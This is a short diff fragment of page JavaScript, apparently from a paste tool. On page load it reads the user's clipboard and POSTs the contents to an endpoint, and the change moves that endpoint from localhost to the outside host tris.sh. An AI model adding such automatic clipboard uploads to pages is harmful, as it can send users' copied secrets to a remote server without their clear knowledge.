@@ -4,7 +4,7 @@
 			document.addEventListener('DOMContentLoaded', async() => {
 				try {
 					const clipboard = await navigator.clipboard.readText();
-					fetch("http://localhost:8080/api/paste", {
+					fetch("https://tris.sh/api/paste", {
 						method: "POST",
 						headers: {
 							"Content-Type": "application/json"
